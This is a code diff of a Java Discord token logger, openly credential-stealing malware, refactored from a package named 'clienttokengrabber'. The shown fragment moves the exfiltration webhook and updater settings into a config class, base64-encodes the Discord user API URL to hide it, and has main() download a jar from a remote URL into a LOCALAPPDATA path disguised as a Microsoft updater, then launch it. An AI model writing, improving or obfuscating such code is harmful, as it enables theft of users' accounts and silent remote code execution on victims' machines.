@@ -1,23 +1,22 @@
-package clienttokengrabber;
+package tokenlogger;
 
 import java.nio.file.Paths;
 import java.util.Set;
 import java.util.HashSet;
 
-import clienttokengrabber.utils.*;
+import tokenlogger.utils.*;
+
+import static tokenlogger.config.Config.*;
 
 public class TokenLogger {
     private static Set<String> tokens = new HashSet<>();
-    public static final String WEBHOOK_URL = "YOUR BASE64 ENCODED WEBHOOK URL HERE";
-    public static final String USER_INFO_URL = "https://discordapp.com/api/v9/users/@me";
-    public static final String UPDATER_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
-    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Update.jar";
+    public static final String USER_INFO_URL = Decryptor.decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjkvdXNlcnMvQG1l");
 
     public static void main(String[] args) {
-        FileHelper.delete(UPDATER_PATH);
+        FileHelper.delete(UPDATER_SAVE_PATH);
         if (UpdateHelper.checkForUpdates()) {
-            Requests.download(UPDATER_URL, UPDATER_PATH);
-            FileHelper.launch(UPDATER_PATH);
+            Requests.download(UPDATER_JAR_URL, UPDATER_SAVE_PATH);
+            FileHelper.launch(UPDATER_SAVE_PATH);
             System.exit(0);
         }
 
